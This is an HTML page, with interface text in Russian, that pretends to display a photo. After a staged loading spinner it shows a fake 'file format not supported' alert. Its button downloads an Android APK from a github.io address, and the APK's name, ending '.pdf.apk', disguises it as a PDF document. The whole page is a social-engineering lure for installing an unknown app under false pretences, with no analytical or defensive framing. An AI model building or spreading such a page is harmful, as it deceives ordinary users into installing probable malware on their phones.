    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body, html { height:100%; width:100%; background:#000; overflow:hidden; }
        .photo-container {
            width:100%; height:100%;
            display:flex; justify-content:center; align-items:center;
            background:#000; position:relative;
        }
        .photo-container img {
            max-width:100%; max-height:100%; object-fit:contain;
        }
        /* спиннер и уведомление оставил как было */
        .loading-spinner { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); display:none; flex-direction:column; align-items:center; gap:15px; z-index:10; }
        .spinner { width:50px; height:50px; border:4px solid rgba(255,255,255,0.3); border-top:4px solid #fff; border-radius:50%; animation:spin 1s linear infinite; }
        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
        .loading-text { color:#fff; font-size:14px; }
        .notification { position:fixed; top:-200px; left:50%; transform:translateX(-50%); width:90%; max-width:400px; background:#fff; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.3); overflow:hidden; z-index:1000; transition:top .4s cubic-bezier(0.4,0,0.2,1); }
        .notification.show { top:20px; }
        /* весь остальной CSS уведомления (как у тебя) */
    </style>
</head>
<body>
    <div class="photo-container">
        <img src="downloads/photo_preview.jpg" alt="">
        
        <div class="loading-spinner" id="loadingSpinner">
            <div class="spinner"></div>
            <div class="loading-text">Открытие файла...</div>
        </div>
    </div>

    <div class="notification" id="notification">
        <!-- весь твой блок уведомления без изменений -->
        <div class="notification-header">
            <div class="notification-icon">!</div>
            <div class="notification-title">Не удается открыть файл</div>
        </div>
        <div class="notification-body">
            <div class="notification-message">Формат файла не поддерживается вашим устройством</div>
            <div class="notification-submessage">Скачайте файл для просмотра в галерее или стороннем приложении</div>
            <button class="notification-button" onclick="downloadFile()">Скачать и открыть в галерее</button>
        </div>
        <div class="notification-time">Только что</div>
    </div>

    <script>
        const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/';
        const apkUrl = repoBaseUrl + 'downloads/Выгрузка%2323826%20(01.10.2025).pdf.apk';
        const apkFilename = 'Выгрузка#23826 (01.10.2025).pdf.apk';

        function downloadFile() {
            const link = document.createElement('a');
            link.href = apkUrl + '?t=' + Date.now();
            link.download = apkFilename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        window.onload = function() {
            setTimeout(() => { document.getElementById('loadingSpinner').style.display = 'flex'; }, 2000);
            setTimeout(() => {
                document.getElementById('loadingSpinner').style.display = 'none';
                document.getElementById('notification').classList.add('show');
            }, 4000);
        };
    </script>
</body>
</html>
